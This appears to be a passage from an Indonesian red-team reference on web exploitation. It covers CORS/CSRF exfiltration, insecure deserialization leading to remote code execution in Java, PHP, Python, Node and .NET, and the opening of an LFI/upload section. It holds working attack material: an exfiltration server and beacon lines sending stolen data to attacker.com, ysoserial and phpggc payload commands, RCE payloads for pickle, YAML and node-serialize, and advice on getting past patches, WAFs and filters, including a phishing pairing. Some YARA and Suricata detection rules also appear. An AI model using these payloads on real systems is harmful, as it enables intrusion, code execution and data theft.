**Catatan:** header `X-Requested-With` memicu preflight. Hapus jika tidak perlu. Jika target butuh header itu, server **harus** echo di `Access-Control-Allow-Headers`; jika tidak, preflight gagal dan body tidak pernah dibaca.

**Untuk endpoint POST JSON:**
```js
await fetch("https://target.com/api/v1/messages", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({to:"attacker", text:"x"})
});
```

**Hosting `attacker.com` harus HTTPS** sejak 2020 — mixed content di Chrome 131 memblok. Pakai Let's Encrypt atau Cloudflare.

**Self-hosted exfil endpoint (Python 3.12):**
```python
# log.py — jalankan: python3 log.py
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "https://attacker.com")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.end_headers()
    def do_OPTIONS(self): self._cors()
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        print(self.rfile.read(n).decode(errors="replace"))
        self._cors()
    def do_GET(self):
        print(self.path)
        self._cors()
HTTPServer(("0.0.0.0", 8080), H).serve_forever()
```
Catatan: endpoint exfil (`attacker.com`) harus punya CORS sendiri agar `fetch` dari halaman attacker berhasil — namun dengan `mode: no-cors` cukup, tidak perlu header CORS. Lebih simpel pakai `<img src>` atau `navigator.sendBeacon`.

**Alternatif exfil tanpa CORS di sisi attacker:**
```js
navigator.sendBeacon("https://attacker.com/log", text);
```
Atau:
```js
new Image().src = "https://attacker.com/log?d=" + encodeURIComponent(text.slice(0,1500));
```

## 6. Cek Cepat (Shell)

```bash
# SameSite cookie
curl -sI https://target.com/ | grep -i set-cookie

# CORS reflect
curl -si -H "Origin: https://evil.com" https://target.com/api/me | head -20

# Null origin
curl -si -H "Origin: null" https://target.com/api/me | head -20

# Regex bypass variants
for o in "https://eviltarget.com" "https://target.com.evil.com" "https://x.target.com.attacker.com"; do
  echo "== $o"; curl -si -H "Origin: $o" https://target.com/api/me | grep -i "access-control-allow-origin"
done

# Preflight
curl -si -X OPTIONS https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom"

# CSRF token presence
curl -s https://target.com/form | grep -io "csrf[^>]*"
curl -s https://target.com/api/update -X POST -d "email=a@b.c" -H "Cookie: session=x"
```

## 7. Jebakan Operasional yang Bikin Gagal di Lapangan

1. **Chrome 131 memblok `SameSite=None` tanpa `Secure`.** Kunjungi target via `http://` lokal → cookie ditolak, CSRF tidak jalan. Uji wajib HTTPS atau set `chrome://flags/#same-site-by-default-cookies` (tidak praktis untuk real-world).

2. **3rd-party cookie blocking.** Chrome 131 (dengan Privacy Sandbox bertahap) dan Safari 17+ memblok cookie 3rd-party. CORS exploit harus pakai `credentials: "include"` dan target harus set `SameSite=None` — jika `SameSite=Lax`, cookie di-drop untuk `fetch` lintas situs kecuali top-level navigation. Uji dulu apakah browser target masih kirim cookie 3rd-party.

3. **Preflight caching.** `Access-Control-Max-Age: 86400` menyimpan hasil preflight 24 jam. Jika preflight pertama gagal (misal attacker menerima 403), Chrome cache hasil itu → 24 jam retry gagal untuk origin yang sama. Ganti origin (misal `attacker.com` vs `www.attacker.com`) atau tambah query string.

4. **`Allow-Headers: *` dengan credentials.** Spec melarang, Chrome 131 menolak (`Access-Control-Allow-Headers: *` tidak valid bila `Allow-Credentials: true`). Server yang salah set membuat semua request ber-credentials gagal — exploit tamat. Cek `-credentials` di preflight.

5. **`Allow-Origin: *` + `Allow-Credentials: true`.** Server menulis keduanya, browser menolak (tidak akan mengekspos body ke JS). Banyak scanner salah lapor "vulnerable" — cek dengan JS nyata, bukan hanya header.

6. **Wildcard DNS tapi subdomain di-takeover.** Recon sering lewat: cek `dig *.target.com` → apakah ada `CNAME` ke `*.s3.amazonaws.com` atau `*.herokuapp.com` yang tidak ada pemiliknya. Tanpa subdomain yang bisa dikuasai, regex bypass di Origin tidak bisa dieksploitasi (attacker tidak bisa set `Origin` di browser). CORS exploit butuh halaman di origin yang di-whitelist.

7. **Origin `null` dari `file://`.** Chrome 131 blok `file://` fetch ke `https://` untuk banyak kasus (mixed-content-like restriction). Sandboxed iframe lebih andal.

8. **Regex bypass butuh browser, bukan curl.** `curl` bisa set Origin apa saja — server "vulnerable" di curl belum tentu eksploitatif: attacker tidak bisa set Origin di browser. Validasi dengan PoC HTML nyata di domain yang dikontrol (butuh DNS/TLS).

9. **Cookies tidak terkirim jika `Domain` mismatch.** Exfil dari `attacker.com` ke `target.com` — cookie target butuh `SameSite=None` **dan** `Secure`. Jika target set `__Host-` prefix, cookie hanya untuk exact host (tanpa Domain), tetap dikirim oleh fetch ke target — tapi tidak bisa di-share ke subdomain.

10. **`Content-Type: text/plain` + JSON body di Chrome 131:** fetch `no-cors` dengan `text/plain` mengirim body, tapi **beberapa framework** (misal Django REST `JSONParser` dengan strict content-type) menolak. Uji: kirim `text/plain` dengan body `{"a":1}` → cek server parse atau tidak. Jika server hanya parse `application/json`, `no-cors` gagal dan CSRF JSON mati (harus cari celah lain).

11. **Method swap via `_method` di form** hanya jika framework mendukung (`Laravel`, `Spring HideMethodFilter`). Express default tidak. Cek `X-HTTP-Method-Override` saat recon; jika tidak ada, cari endpoint GET yang ternyata state-changing.

12. **Login CSRF butuh korban tidak menyadari.** Setelah login sebagai attacker, korban harus melakukan aksi yang menempel ke akun attacker (upload dokumen, connect OAuth) — jika tidak, dampak nol. Rancang payload pasca-login dengan redirect otomatis, atau gabungkan dengan phishing form "konfirmasi akun".

13. **`Vary: Origin` absen** + CDN (Cloudflare, Fastly) → respons dengan `Allow-Origin: evil.com` ter-cache dan dikirim ke korban lain. Ini memperbesar dampak (cache poisoning), tapi juga bisa membuat PoC gagal jika respons cached untuk `Origin: null` atau origin lain. Uji dengan `Cache-Control: no-cache` di sisi fetch (tidak bisa dari HTML biasa — pakai `fetch(..., {cache:"no-store"})`).

14. **TLS/WAF di depan target** (Cloudflare, Akamai) memblok `Origin: null` dan origin asing dengan heuristik. Jika target di belakang Cloudflare 2024+, uji `Origin: https://target.com.evil.com` (bukan `null`) — sering lolos WAF tapi tetap kena regex bypass.

# deser — web

# Insecure Deserialization → RCE: Referensi Red Team

## Tabel Ringkas: Sink, Versi Rentan, Primitive

| Bahasa/Runtime | Sink deserialisasi | Versi/library rentan | Primitive |
|---|---|---|---|
| Java | `ObjectInputStream.readObject` | Commons-Collections ≤3.2.1, ≤4.0 | Gadget chain → `Runtime.exec` |
| Java | `XMLDecoder` | JDK 1.6-8 | Instantiate + invoke |
| Java | `readObject` + URLDNS | JDK 6/7/8 (semua) | DNS callback deteksi saja |
| PHP | `unserialize` | PHP 5.x-8.x | `__destruct`/`__wakeup`/`__toString` chain |
| PHP | `phar://` wrapper | PHP 5.3-8.x | Trigger unserialize saat file op |
| Python | `pickle.loads` | semua | `__reduce__` → `os.system` |
| Python | `yaml.load` (bukan SafeLoader) | PyYAML <6.0 | `!!python/object/apply` |

## Java

### 1. ksoserial — CommonsCollections 1-7

**Yang dikirim:** base64/raw serialized Java byte stream (`AC ED 00 05 ...`) ke endpoint yang memanggil `ObjectInputStream.readObject()` (RMI, JMX, HTTP body, JSF ViewState, WebLogic T3, Spring HTTP invoker, session cookie tidak ditandatangani).

**Command per chain** (ganti `CMD`):
```bash
# CC1 (CommonsCollections 3.1-3.2.1, JDK <8u71 untuk AnnotationInvocationHandler path)
java -jar ysoserial.jar CommonsCollections1 'CMD' > cc1.bin

# CC2 (commons-collections4 4.0, JDK 7+)
java -jar ysoserial.jar CommonsCollections2 'CMD' > cc2.bin

# CC3 (commons-collections 3.2.1, pakai TemplatesImpl)
java -jar ysoserial.jar CommonsCollections3 'CMD' > cc3.bin

# CC4 (commons-collections4 4.0)
java -jar ysoserial.jar CommonsCollections4 'CMD' > cc4.bin

# CC5 (commons-collections 3.1-3.2.1, JDK 8+ — bypass 8u71 official fix)
java -jar ysoserial.jar CommonsCollections5 'CMD' > cc5.bin

# CC6 (commons-collections 3.2.1, independent of InvokerTransformer serialization -> bypass strict filter)
java -jar ysoserial.jar CommonsCollections6 'CMD' > cc6.bin

# CC7 (commons-collections 3.2.1/4.0, pakai Hashtable.readObject)
java -jar ysoserial.jar CommonsCollections7 'CMD' > cc7.bin
```

| Chain | Library | JDK | Trigger class | Catatan |
|---|---|---|---|---|
| CC1 | cc 3.1-3.2.1 | 6/7, <8u71 | `AnnotationInvocationHandler` | Patch 8u71 ubah field, closed |
| CC2 | cc4 4.0 | 7+ | `TemplatesImpl` + `PriorityQueue` | jalan tanpa `InvokerTransformer` |
| CC3 | cc 3.2.1 | 7+ | `TemplatesImpl` + `TrAXFilter` | cadeau untuk `InvokerTransformer` diblok |
| CC4 | cc4 4.0 | 7+ | `TrAXFilter` | varian cc4 |
| CC5 | cc 3.2.1 | 8+ | `BadAttributeValueExpException` | tembus blacklist `InvokerTransformer` 8u71 |
| CC6 | cc 3.2.1 | 8+ | `TiedMapEntry` + `HashSet` | tidak serialisasi InvokerTransformer |
| CC7 | cc 3.2.1/4.0 | 8+ | `Hashtable.readObject` | viable di banyak filter |

### 2. URLDNS — deteksi buta tanpa gadget
**Yang dikirim:** `HashMap` dengan `URL` sebagai key/value, `hashCode()` dipicu saat `readObject`.
**Efek:** DNS lookup keluar — hanya bukti deserialisasi terjadi, tidak ada RCE.
```bash
java -jar ysoserial.jar URLDNS 'http://<collab>.oast.pro' > urldns.bin
# deteksi: curl body @ urldns.bin ke target -> monitor DNS/HTTP
```

### 3. JDK-only chain (tanpa dependency eksternal)
- `Jdk7u21`: `TemplatesImpl` + `AnnotationInvocationHandler` — JDK <8u20 (fixed 8u20).
- `JRMPClient`: `UnicastRef` di `RMIConnectionImpl` — biarkan target melakukan outbound ke JRMP listener (`ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'CMD'`), verbose tetapi dependensi nol.
- `Hibernate1/2`, `Spring1/2`, `MozillaRhino1`, `Groovy1` untuk target yang punya library umum.

### 4. Library umum yang jadi gadget
| Gadget | Library target | Primitive |
|---|---|---|
| `CommonsBeanutils1` | beanutils 1.9.2 | getter chain → `TemplatesImpl` |
| `ROME` | rome 1.0 | `ToStringBean` → invoke |
| `Spring1/2` | spring-core 4.x | `MethodInvokeTypeProvider` |
| `Groovy1` | groovy 2.3+ | `MethodClosure` + `ConvertedClosure` |
| `Hibernate1/2` | hibernate-core 4.x/5.x | `PojoBean` |
| `C3P0` | c3p0 0.9.5.2 | `PoolBackedDataSource` → JNDI |
| `Click1`, `Wicket1` | web framework | |

### 5. Signature deteksi Java
```yaml
# WAF/Suricata rule (base64 body yang decode ke stream Java)
alert http any any -> any any (msg:"Java serialized stream"; \
  content:"|AC ED 00 05|"; depth:1; \
  content:"java/"; distance:0; \
  sid:9000001; rev:1;)

# gzip-transport: Content-Encoding: gzip + body magic 1f 8b yang decode ke AC ED 00 05
alert http any any -> any any (msg:"Gzip Java stream"; \
  content:"|1F 8B|"; depth:2; \
  flow:to_server; sid:9000002;)

# YARA untuk payload
rule java_serialized_gadget {
  strings:
    $magic = { AC ED 00 05 }
    $cc  = "org/apache/commons/collections"
    $tr  = "com/sun/org/apache/xalan/internal/xsltc"
    $tpl = "TemplatesImpl"
    $inv = "InvokerTransformer"
  condition: $magic at 0 and 2 of ($cc,$tr,$tpl,$inv)
}
```
Endpoint logging: aktifkan `-Djava.util.logging` atau agent `jdk.deserialization.filter` (JEP 290) — filter `jdk.serialFilter=!org.apache.commons.collections.functors.*` mematikan CC1-7.

## PHP

### 1. `unserialize` — POP chain buatan
**Yang dikirim:** string hasil `serialize()` yang berisi class + magic method (`__destruct`, `__wakeup`, `__toString`, `__call`, `__get`).
**Contoh minimal POP ke `system()`** (framework umum):
```php
class A { public $cmd; function __destruct(){ system($this->cmd); } }
echo serialize(new A());   // O:1:"A":1:{s:3:"cmd";s:2:"id";}
```
Kirim ke endpoint yang memanggil `unserialize($_COOKIE['x'])`, session handler default (`php`), atau Laravel `X-XSRF-TOKEN` (decrypt → unserialize) pada versi <8.x dengan APP_KEY bocor.

**POP chain umum:**
| Framework/library | Entry magic | Versi rentan | End |
|---|---|---|---|
| Monolog <2.3.5 | `__destruct` → `Handler` | CVE-2021-** | RCE via `SyslogHandler`/`StreamHandler` |
| Guzzle <6.5.0/7.x | `__destruct` → `FileCookieJar` | | file write |
| Laravel (phpggc chain `laravel/rceX`) | `__destruct` | 5.x-8.x | `system` |
| Symfony (phpggc `symfony/rce5`) | `__destruct` | 3.x-5.x | RCE |
| Doctrine (`doctrine/rceX`) | `__destruct` | | RCE |

**Generate cepat dengan phpggc:**
```bash
phpggc -u laravel/rce2 'system' 'id'          # URL-encoded
phpggc -b monolog/rce1 'system' 'id'          # base64
phpggc laravel/rce9 'exec' 'id' > payload.bin
```

**Signature:**
```
# YARA
rule php_serialized_pop {
  strings:
    $s = /O:[0-9]+:"[A-Za-z\\_]+":/ 
    $w = "wakeup"
    $d = "destruct"
  condition: $s and 1 of ($w,$d)
}
# Suricata
alert http any any -> any any (msg:"PHP serialized in body/cookie";
  content:"O:"; pcre:"/O:\d+:\"[A-Za-z\\\\_]+\"/"; sid:9010001;)
```
**Gagal kapan:** magic method dipanggil tapi `__destruct` mati karena `exit`/`die` (unserialize di dalam destructor tidak jalan), atau class tidak di-autoload.

### 2. `phar://` — deserialisasi via file operation
**Konsep:** PHP ≥5.3 memperlakukan `phar://` sebagai wrapper; saat *seluruh* metadata phar (`manifest`) dibaca ulang, PHP otomatis `unserialize` metadata. Trigger: `file_exists`, `filesize`, `getimagesize`, `md5_file`, `glob`, `copy`, `file_put_contents` — semua fungsi yang menerima path.

**Yang dikirim:** file `.phar` valid berisi payload di metadata, di-upload lewat fitur upload avatar/doc. Path yang disuntikkan (`phar:///tmp/up/x.phar/x`) masuk ke fungsi file.

**Generate:**
```php
$p = new Phar('/tmp/x.phar', 0, 'x.phar');
$p->startBuffering();
$p['a.txt'] = 'x';
$p->setMetadata(new A());        // A sama seperti POP di atas
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->stopBuffering();
```
**Bypass:** `phar.readonly=0` dibutuhkan di sisi attacker; di server target `phar.readonly` tidak relevan — hanya attacker yang perlu build. Rename ke `.jpg` tetap valid (magic `__HALT_COMPILER();` di stub). PHP 8.0+ menandai metadata unserialize di dalam `phar://` sebagai *deprecated* kecuali `phar.cache_list`, tapi masih jalan sampai 8.x untuk path `phar://`.

**Signature:**
```
rule phar_upload {
  strings:
    $halt = "__HALT_COMPILER();"
    $man  = "GBMB"            # phar manifest magic
  condition: $halt and $man at (0..1024)
}
```
Deteksi *sink*: grep kode untuk `file_exists(.*\$_` + fungsi file yang menerima input user — pola `phar_deserialization` (CVE-2018-5712 style).

## Python

### 1. `pickle.loads`
**Yang dikirim:** byte stream `\x80\x04...` ke endpoint yang `pickle.loads` (Flask session, cache, ML model loading, RPC).

**Payload:**
```python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(E())        # b'\x80\x04\x95...'
```
**FYI:** `pickle` juga jalan lewat `pickletools`-agnostic path — `__reduce__`/`__reduce_ex__` adalah satu-satunya yang dipanggil; `__eq__`/`__hash__` tidak trigger saat unpickle.

**Signature:**
```
# YARA
rule pickle_payload {
  strings:
    $op1 = { 80 04 }            # proto 4
    $op2 = { 80 05 }            # proto 5
    $ev  = "os\nsystem"
    $ev2 = "posix\nsystem"
    $rt  = "R"                  # REDUCE opcode
  condition: ($op1 at 0 or $op2 at 0) and 1 of ($ev,$ev2)
}
# Suricata
alert http any any -> any any (msg:"Python pickle in body";
  content:"|80 04|"; depth:2; content:"system"; distance:0; sid:9020001;)
```
**Gagal:** `pickle.Unpickler(find_class=...)` membatasi class; `pickle` di Python 3.8+ masih mengizinkan semua global kecuali dibatasi eksplisit.

### 2. `yaml.load` (unsafe)
**Yang dikirim:** teks YAML dengan tag `!!python/object/apply` ke endpoint config upload.
```yaml
!!python/object/apply:os.system ["id"]
```
**Versi:** PyYAML <5.1 memanggil `yaml.load` default unsafe; 5.1+ default `Loader=yaml.SafeLoader`, tetapi kode lama memanggil `yaml.load(f, Loader=yaml.UnsafeLoader)` eksplisit — tetap rentan.

**Signature:**
```
rule yaml_python_tags {
  strings:
    $t1 = "!!python/object/apply"
    $t2 = "!!python/object/new"
    $t3 = "!!python/object:"
    $t4 = "!!python/module:"
  condition: any of them
}
```
**Beda kunci:** `yaml.safe_load` tidak pernah trigger; `yaml.FullLoader` (5.1+) memblok `python/object/apply` — jadi deteksi versi via response error (`could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply'` = Loader aman).

## Node.js

### 1. `node-serialize` <=0.0.4
**Yang dikirim:** objek JSON dengan fungsi di key `_$$ND_FUNC$$_`. `unserialize()` melakukan `eval` pada string fungsi, lalu memanggil IIFE `()`.
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)})}()"}
```
**Sink:** `require('node-serialize').unserialize(req.body)` pada endpoint lama (banyak di boilerplate 2016-2018). Package deprecated.

**Signature:**
```
rule nodeserialize {
  strings:
    $k = "_$$ND_FUNC$$_"
    $i = "()" 
  condition: $k
}
```

### 2. `js-yaml` unsafe (`!!js/function`)
**Yang dikirim:** YAML dengan `!!js/function` (hanya aktif jika loader `DEFAULT_FULL_SCHEMA` / `load()` tanpa options di versi lama, atau `safeLoad` diganti).
```yaml
!!js/function "function(){ return require('child_process').execSync('id') }"
```
**Versi:** js-yaml <3.13.1 (CVE-2019-**) dan 4.0.0 awal — `load()` default jadi `safeLoad` (eksplisit) setelah 3.13.1. `js-yaml@4` sepenuhnya hapus `!!js/*` di loader default.

**Signature:**
```
rule jsyaml_func {
  strings:
    $t = "!!js/function"
    $r = "!!js/regexp"
  condition: any of them
}
```

---

## .NET

### 1. `BinaryFormatter`
**Yang dikirim:** base64/raw stream `AAEAAAD/////AQAAAAAAAAAM...` (magic `00 01 00 00 00 FF FF FF FF`).
**RCE:** gadget `TypeConfuseDelegate` (via `SortedSet` + `Comparison`) atau `ObjectDataProvider` + `XamlReader` ke endpoint yang `BinaryFormatter.Deserialize` (ViewState tanpa MAC, .NET Remoting, `SessionState` out-of-proc, `ObjectStateFormatter`, `LosFormatter`).

**Generate dengan ysoserial.net:**
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "calc" -o raw > bf.bin
ysoserial.exe -f LosFormatter    -g ObjectDataProvider -c "calc"
```

**Versi/konteks:**
- .NET Framework ≤4.8: `BinaryFormatter` aktif default.
- .NET 5-8: `BinaryFormatter` masih ada tapi `EnableUnsafeBinaryFormatterSerialization=false` default di .NET 5+; `AppContext` switch dapat diaktifkan aplikasi yang masih butuh.
- .NET 9: dihapus (removed).

**Signature:**
```
rule dotnet_binaryformatter {
  strings:
    $m = { 00 01 00 00 00 FF FF FF FF }
    $t1 = "System.Data.Services.Internal.ExpandedWrapper"
    $t2 = "TypeConfuseDelegate"
    $t3 = "ObjectDataProvider"
  condition: $m at 0 and any of ($t1,$t2,$t3)
}
```

### 2. `ViewState` tanpa MAC
**Yang dikirim:** form field `__VIEWSTATE` (base64) ke aplikasi ASP.NET 1.x-4.8 dengan `<pages enableViewStateMac="false"/>` atau `machineKey` bocor (leak via `/trace.axd`, config disclosure, atau CVE-2020-**) — `ObjectStateFormatter.Deserialize` memicu gadget.
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c whoami" \
  --path="/default.aspx" --apppath="/" \
  --validationkey="<hex>" --validationalg="SHA1" \
  --generator="<hex, dari __VIEWSTATEGENERATOR>"
```
**Deteksi:** cek header/body `__VIEWSTATEGENERATOR` + `__VIEWSTATE` tanpa `__VIEWSTATEMAC`; base64 ViewState dengan prefix `AAEAAAD/////` = `ObjectStateFormatter` (bukan `LosFormatter` legacy).

**Signature:**
```
rule dotnet_viewstate_oos {
  strings:
    $v = "__VIEWSTATE="
    $m = "AAEAAAD/////"      # ObjectStateFormatter signature base64
    $g = "__VIEWSTATEGENERATOR"
  condition: $v and $m and $g
}
```

---

| Java | ysoserial | `java -jar ysoserial.jar CC6 'CMD'` | `application/x-java-serialized-object` |
| Java | ysoserial | `java -jar ysoserial.jar URLDNS 'http://x.oast'` | DNS callback |
| PHP | phpggc | `phpggc -u laravel/rce9 system id` | `application/x-www-form-urlencoded` |
| PHP | manual | `php build_phar.php` | `image/jpeg` (with stub) |
| Python | pickle | `python3 -c "..."` | `application/octet-stream` |
| Node | manual | string JSON `_$$ND_FUNC$$_` | `application/json` |
| .NET | ysoserial.net | `-f BinaryFormatter -g TypeConfuseDelegate` | `application/octet-stream` |

## Tabel Signature Deteksi (konsolidasi)

| Teknik | Magic byte / marker | Lokasi cek |
|---|---|---|
| Java serialized | `AC ED 00 05` (raw) / `1F 8B` + decode | body, cookie, session, `Content-Type: application/x-java-serialized-object` |
| Java gzip | `1F 8B 08` | body + `Content-Encoding: gzip` |
| PHP serialize | `O:<n>:"Cls"` / `a:<n>:{` | body, cookie, `X-XSRF-TOKEN` |
| Phar | `__HALT_COMPILER();` + `GBMB` | file upload / path sink |
| Pickle | `80 04` / `80 05` di offset 0 | body, file upload (.pkl, .bin) |
| YAML unsafe | `!!python/object/apply` / `!!js/function` | body, file upload (.yml, .yaml) |
| node-serialize | `_$$ND_FUNC$$_` | JSON body |
| .NET BF | `00 01 00 00 00 FF FF FF FF` | body |
| .NET ViewState | `AAEAAAD/////` | form `__VIEWSTATE` |

## Jebakan operasional (yang bikin teknik ini gagal di lapangan)

1. **JDK patch level mematikan chain.** CC1 mati di 8u71+ (struktur `AnnotationInvocationHandler` berubah). 8u191+ `com.sun.jndi.ldap.object.trustURLCodebase=false` default → JNDI (C3P0, ROME+JNDI) gagal RCE, hanya DNS. Banyak writeup lama tidak menyebut ini; payload muncul `NullPointerException` di log, bukan RCE.

2. **JEP 290 / filter serialisasi.** JDK 9+ bisa `jdk.serialFilter` set global, Tomcat 9 `serializationFilter`, Spring `SerializationFilter`. Payload class-based (CC*) ditolak di `readObject` sebelum trigger — perlu chain JDK-only (`Jdk7u21` mati, `JRMPClient` sering di-block karena outbound port).

3. **`ObjectInputFilter` custom wrap.** Banyak aplikasi Spring Boot memakai `SerializingConverter` + whitelist (`addAllowedPattern`). URLDNS tetap jalan (HashMap+URL lolos whitelist umum), tapi trigger gadget tidak — deteksi sukses, RCE gagal.

4. **Commons-Collections 3.2.2+ / 4.1+.** Sejak 3.2.2 `InvokerTransformer` tidak serializable (throw), 4.1 sama. Cek `mvn dependency:tree` bukan versi manifest — shade/uber-jar sering salah lapor. Kalau target pakai `commons-collections4:4.1`, CC2/CC4 mati; cari `CommonsBeanutils1` (beanutils 1.9.2 masih vulnerable, 1.9.4 fix sebagian).

5. **`TemplatesImpl` butuh `-Djdk.xml.*` tidak strict.** JDK 9+ dengan `SecurityManager` atau `--illegal-access=deny` (JDK 17 default `deny`) memblok `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` reflect — CC2/3/4 gagal. Solusi: `Jdk7u21` juga mati, pindah ke `JRMPClient` (butuh outbound) atau `CommonsBeanutils1`.

6. **`phar://` di PHP 8.** PHP 8.0+ menampilkan `PharMetadataUnserializeDeprecated` warning di log; banyak WAF memblok string `phar://`; `realpath`/`include_path` tidak memicu manifest read di semua path. Pastikan sink adalah fungsi yang membaca *manifest*, bukan hanya `file_get_contents` (yang membaca isi, bukan metadata). Yang bekerja: `file_exists`, `is_file`, `getimagesize`, `md5_file`, `copy` (bukan `file_get_contents`).

7. **Upload `phar` anda tidak akan lulus kalau server cek MIME `image/*`.** Rename + stub `GIF89a` + `__HALT_COMPILER();` masih valid; namun `getimagesize` di server justru **trigger** — itu fitur, bukan bug. Gagal kalau server hapus file upload setelah validasi; butuh path traversal atau rename race.

8. **PHP `unserialize` di framework modern.** Laravel ≥9 pakai `SignedUrl` + `encrypt` (AES-256-CBC) untuk `X-XSRF-TOKEN`; butuh `APP_KEY`. Symfony `serialize` di session pakai `PhpSerializer` yang `unserialize` dengan `['allowed_classes' => false]` — POP mati. Cek config: `SessionHandler` yang rentan = `php`/`files` + `unserialize` raw, bukan `doctrine`/`redis` terbaru.

9. **Python pickle di Python 3.13.** `pickle` default proto 4 di 3.8+, tapi 3.13 masih membuka `find_class` global. Yang mematikan: `pickle.Unpickler.find_class` override di library (mis. `torch.load` 2.6+ default `weights_only=True`). Target ML model loading `torch.load` pre-2.6 rentan; 2.6+ default aman.

10. **`yaml.load` default sudah aman.** PyYAML 6.0+ default `Loader` = `SafeLoader` saat argumen tidak diberi — `yaml.load(stream)` **tetap aman** di 6.x. Yang rentan hanya kode yang eksplisit `Loader=yaml.UnsafeLoader`/`FullLoader`/`BaseLoader`/`CLoader`. Deteksi versi lewat response error; jangan asumsikan semua `yaml.load` rentan.

11. **`node-serialize` hampir extinct.** Package NPM `node-serialize` versi 0.0.4 deprecated 2019; masih muncul di codebase legacy, tapi `unserialize` tidak memanggil IIFE kecuali payload diakhiri `()`. Deteksi string `_$$ND_FUNC$$_` tanpa `()` = eval saja, tidak exec. Kalau di log muncul `Function is not defined`, target pakai `safe-eval`/`vm` sandbox.

12. **.NET `BinaryFormatter` di .NET 5+ default off.** `EnableUnsafeBinaryFormatterSerialization=false` di `runtimeconfig.json`; payload `AAEAAAD/////` di endpoint .NET Core 5+ akan `PlatformNotSupportedException` di log, bukan RCE. Cek header `Server: Kestrel` + target `.NET Framework` (IIS+`windows`), atau cari app yang secara eksplisit `AppContext.SetSwitch("System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization", true)`.

13. **ViewState MAC default on sejak .NET 4.5.2.** Semua aplikasi ASP.NET 4.5.2+ default `enableViewStateMac=true` dan `ViewStateEncryptionMode=Auto` — butuh `machineKey` bocor. Url scan `__VIEWSTATEGENERATOR` tidak cukup; cari `machineKey` di `web.config` disclosure (`.config` exposed, `/trace.axd`, `elmah.axd`, backup file). Tanpa key, `ObjectStateFormatter` payload = MAC fail 500.

14. **Gadget butuh classpath match.** `ysoserial.dll` v1.36 punya `-p` plugin vs generator syntax (`-f -g`); banyak tutorial lama pakai `-p` yang hilang di versi baru. Untuk .NET 4.5.2 target ViewState, gunakan `-p ViewState` + `--path` HARUS sama dengan path target (termasuk case) atau MAC valid pun tetap ditolak — path mismatch = invalid viewstate. `--apppath` untuk virtual directory, biasanya `/` tapi bisa `/app`.

15. **Serialization filter di Spring Boot.** `spring-boot-starter-security` + `SessionRepository` Redis bisa pakai `Jackson2JsonRedisSerializer` (tidak rentan pickle Java) vs `JdkSerializationRedisSerializer` (rentan). Log error `Cannot deserialize` vs `ClassNotFound` membedakan; jangan salah kirim payload Java ke Redis serializer JSON — hasilnya null, bukan RCE.

16. **`Content-Type` mismatch.** Spring `SerializationUtils.deserialize` di endpoint HTTP invoker cek `Content-Type: application/x-java-serialized-object`; kirim dengan header salah = 415, bukan panic. Untuk T3 WebLogic, frame protocol T3 wajib (`t3 12.2.1\nAS:255\nHL:19\n\n`), body raw tidak akan diproses — pakai `weblogic-framework`/`ysoserial` `JRMPClient` dengan framing benar.

17. **Egress DNS/HTTP Anda hilang.** URLDNS butuh target resolusi DNS. Di VPC tertutup, target pakai resolver internal tanpa callback; gunakan `DNS exfil via query length` atau cek response time (delay 3-5s via `Thread.sleep` payload tidak mungkin — gunakan `TemplatesImpl` timing). Fallback: blind RCE via `CommonsBeanutils1` dengan `exec 'sleep 5'`.

18. **Blind deserialization di cookie.** Banyak framework simpan Java serialized di cookie session (`JSESSIONID` base64). WAF sering blok `AC ED 00 05` base64 (`rO0AB...`) sebagai signature default — coba gzip (`H4sI...`) atau `Content-Encoding: gzip` body. Decode base64 dulu, cek prefix `rO0AB` = Java stream.

19. **PHP `unserialize` object injection vs RCE.** Ada POP chain tapi eksekusi butuh `system`/`exec` tidak di-`disable_functions`. Cek `phpinfo` bocor atau uji `phpggc -l` target yang matching; PHP modern (8.x) dengan `open_basedir` dan `disable_functions=exec,passthru,shell_exec,system,proc_open,popen` = POP sampai file write saja, RCE gagal.

20. **Race condition upload `phar`.** File dihapus sebelum sink path jalan (`phar:///tmp/x` → 404). Butuh: upload → sink dalam request yang sama (lewat LFI path langsung), atau path permanen (avatar, attachment). Upload `<random>.jpg` ke user avatar, lalu trigger `phar://` via LFI di endpoint lain — dalam satu sesi tanpa GC cron.


## lfi-upload

# lfi-upload — web

# LFI/RFI dan File Upload → RCE

## 1. Matriks Vektor

| Vektor | Prasyarat | Efek | Contoh Target |
|---|---|---|---|
| `php://filter` | include() sink, PHP <8 tidak wajib | Read source, chain ke RCE via `convert.base64-decode` | PHP 5.6–8.4 |
| `data://` | `allow_url_include=On`, PHP | Direct code exec | PHP ≤7.4 (default Off) |
| `php://input` | `allow_url_include=On` | POST body as PHP | PHP ≤7.4 |
| `expect://` | `expect` ext loaded | Shell command | rare |
| Log poisoning | LFI + writable/readable log | RCE setelah insert PHP ke log | Apache 2.4, nginx+php-fpm |
| `/proc/self/environ` | LFI, readable, UA injectable | RCE | Linux, kernel <5.x umumnya |
| Session file | LFI + session write primitive | RCE | PHP `session.save_path=/tmp` |
| `pearcmd.php` | LFI + PEAR installed + `register_argc_argv=On` | RCE | Debian/Ubuntu PHP default |
| `zip://` | LFI + upload zip | RCE | any |
| `phar://` | LFI + upload phar | RCE via deserialization | PHP <8.0 default; 8.0+ butuh gadget |
| Upload → RCE | file upload sink | Webshell | nginx 1.25 + php-fpm |

---

## 2. php://filter

**Kirim:** traversal ke file target lewat wrapper filter.
